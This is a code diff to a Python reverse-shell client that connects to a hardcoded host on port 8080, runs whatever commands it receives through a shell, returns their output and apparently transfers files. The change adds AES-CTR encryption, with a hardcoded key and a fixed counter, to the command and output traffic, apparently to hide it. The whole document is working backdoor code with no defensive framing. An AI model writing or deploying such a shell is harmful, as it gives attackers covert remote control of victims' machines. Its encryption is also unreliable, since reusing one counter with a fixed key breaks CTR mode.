@@ -1,6 +1,18 @@
 import socket
 import subprocess
 import os
+from Crypto.Cipher import AES
+
+counter = "X" * 16
+key = "X" * 16
+
+def encrypt(message):
+    enc = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
+    return enc.encrypt(message)
+
+def decrypt(message):
+    enc = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
+    return enc.decrypt(message)
 
 def transfer(s,path):
     
@@ -22,7 +34,7 @@ def connect():
     s.connect(('192.168.233.128',8080))
 
     while True:
-        command = s.recv(1024)
+        command = decrypt(s.recv(1024))
 
         if 'terminate' in command:
             s.close()
@@ -42,8 +54,8 @@ def connect():
 
         else:
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            s.send(CMD.stdout.read())
-            s.send(CMD.stderr.read())
+            s.send(encrypt(CMD.stdout.read()))
+            s.send(encrypt(CMD.stderr.read()))
 
 def main():
     connect()
